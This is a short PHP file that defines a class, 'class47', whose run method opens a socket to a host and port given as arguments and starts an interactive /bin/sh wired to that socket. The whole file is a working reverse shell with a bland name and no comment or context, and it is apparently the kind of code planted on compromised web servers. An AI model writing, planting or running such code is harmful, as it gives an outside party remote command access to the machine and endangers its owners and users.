<?php
class class47
{
  public function run($a, $b) 
{
        $polie=fsockopen($a,$b);
        $dol=proc_open("/bin/sh -i", array(0=>$polie, 1=>$polie, 2=>$polie),$pipes);
}
}
?>
